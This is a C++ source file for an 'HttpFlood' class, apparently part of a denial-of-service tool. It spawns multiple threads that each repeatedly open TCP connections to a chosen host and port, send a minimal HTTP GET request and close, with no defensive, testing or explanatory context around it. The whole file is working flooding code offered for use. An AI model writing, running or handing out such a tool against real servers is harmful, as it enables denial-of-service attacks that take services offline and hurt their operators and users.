#include "HttpFlood.h"
#include <iostream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>

HttpFlood::HttpFlood(const std::string& host, uint16_t port, size_t threads, size_t requests)
    : targetHost(host), targetPort(port), threadCount(threads), requestCount(requests) {}

void HttpFlood::performFlood() {
    for (size_t i = 0; i < requestCount; ++i) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            std::lock_guard<std::mutex> lock(coutMutex);
            std::cerr << "Failed to create socket\n";
            continue;
        }

        struct sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(targetPort);

        if (inet_pton(AF_INET, targetHost.c_str(), &serverAddr.sin_addr) <= 0) {
            std::lock_guard<std::mutex> lock(coutMutex);
            std::cerr << "Invalid address: " << targetHost << "\n";
            close(sockfd);
            continue;
        }

        if (connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
            std::lock_guard<std::mutex> lock(coutMutex);
            std::cerr << "Connection failed: " << strerror(errno) << "\n";
            close(sockfd);
            continue;
        }

        std::string request = "GET / HTTP/1.1\r\nHost: " + targetHost + "\r\n\r\n";
        send(sockfd, request.c_str(), request.size(), 0);
        close(sockfd);
    }
}

void HttpFlood::start() {
    std::vector<std::thread> threads;
    for (size_t i = 0; i < threadCount; ++i) {
        threads.emplace_back([this]() { this->performFlood(); });
    }

    for (auto& thread : threads) {
        thread.join();
    }
}
